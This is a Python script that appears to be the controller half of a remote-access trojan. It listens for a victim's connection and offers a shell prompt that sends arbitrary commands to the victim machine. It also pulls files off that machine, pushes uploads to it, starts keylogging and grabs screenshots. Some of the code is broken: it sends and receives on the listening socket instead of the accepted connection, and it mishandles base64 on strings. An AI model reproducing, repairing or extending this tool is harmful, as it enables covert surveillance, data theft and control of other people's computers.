import json
import socket
import base64

s = None
ip = None
target = None
count = 1


def server():
    global s
    global ip
    global target

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 54321))

    s.listen(5)
    print("Listening for Incoming connections")

    target, ip = s.accept()
    print(f"Target:{target}; IP: {ip}")


def reliable_send(data):

    json_data = json.dumps(data)
    print(s)
    s.send(bytes(json_data, 'utf-8'))


def reliable_recv():

    json_data = ""
    while True:
        try:
            data = s.recv(1024)
            json_data = json_data + data.decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    global count
    while True:
        command = input(f"Shell#~{str(ip)}: ")
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = reliable_recv()
                file.write(base64.b64decode(result))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to upload the file"
                reliable_send(base64.b64encode(failed))
        elif command[:12] == "keylog_start":
            continue
        elif command[:10] == "screenshot":
            with open(f'screenshot-{count}', "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded == "[!!]":
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    print(f"Screenshot saved as {screen.name}")
                    count += 1
        else:
            result = reliable_recv()
            print(result)


server()
shell()
s.close()
